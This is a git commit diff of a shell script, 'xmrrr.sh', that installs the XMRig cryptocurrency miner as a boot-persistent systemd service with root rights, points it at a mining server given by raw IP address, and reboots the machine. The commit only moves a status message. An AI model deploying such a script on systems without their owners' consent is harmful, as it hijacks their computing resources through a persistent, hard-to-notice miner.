2e9bf8efb8134bcd7392762e1bb37948e3cecfd8
joplinsolieso <105708394+joplinsolieso@users.noreply.github.com>
2022-08-06 20:52:16 +0700

    Update xmrrr.sh

--- xmrrr.sh
+++ xmrrr.sh
@@ -4,6 +4,5 @@ sudo tar xvzf xmrig-6.16.2-linux-static-x64.tar.gz
 sudo bash -c 'echo -e "[Unit]\nDescription=XMRig Miner\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/xmrig-6.16.2/xmrig -o 3.142.80.182:443 --randomx-no-rdmsr --tls true\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/xmrig.service'
 sudo systemctl daemon-reload
 sudo systemctl enable xmrig.service
-echo "Setup completed!"
 sudo reboot
 echo "Setup completed!"
